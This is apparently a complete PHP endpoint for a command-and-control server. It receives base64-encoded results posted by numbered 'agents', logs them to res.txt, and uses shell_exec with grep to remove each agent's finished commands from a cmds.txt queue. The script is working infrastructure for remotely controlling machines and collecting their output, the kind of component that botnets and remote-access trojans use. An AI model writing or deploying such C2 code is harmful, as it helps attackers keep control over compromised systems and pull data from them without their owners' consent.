<?php
$id=$_REQUEST[ 'id' ];
$resp=$_REQUEST[ 'res' ];

if (!empty($resp)) {

$res = base64_decode($resp); 
$file = 'res.txt';
$current = file_get_contents($file);
$current .= "Agent ".$id." => ".$res.PHP_EOL;
file_put_contents($file, $current);

$id = intval($_GET['id']);
$sid = strval($id);
shell_exec("cat cmds.txt | grep -v ".$sid." > temp");
shell_exec("cat temp > cmds.txt");
}

?>
